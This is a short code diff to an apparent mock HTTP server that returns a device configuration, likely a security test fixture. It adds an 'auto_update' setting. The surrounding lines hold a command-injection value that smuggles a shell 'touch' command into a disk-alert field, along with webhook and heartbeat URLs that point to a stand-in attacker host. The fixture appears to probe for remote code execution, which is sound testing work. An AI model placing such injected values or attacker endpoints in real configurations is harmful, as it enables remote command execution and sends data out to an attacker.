@@ -83,6 +83,7 @@ class Handler(BaseHTTPRequestHandler):
                     "alert_mem_pct": 80,
                     "alert_disk_pct": "x[$(touch${IFS}$HYN_VAR/cloud-rce-marker)]",
                     "report_at": "07:30",
+                    "auto_update": "install",
                     "notify_access_details": "on",
                     "webhook_url": "https://attacker.example/hook",
                     "heartbeat_url": "https://attacker.example/ping",
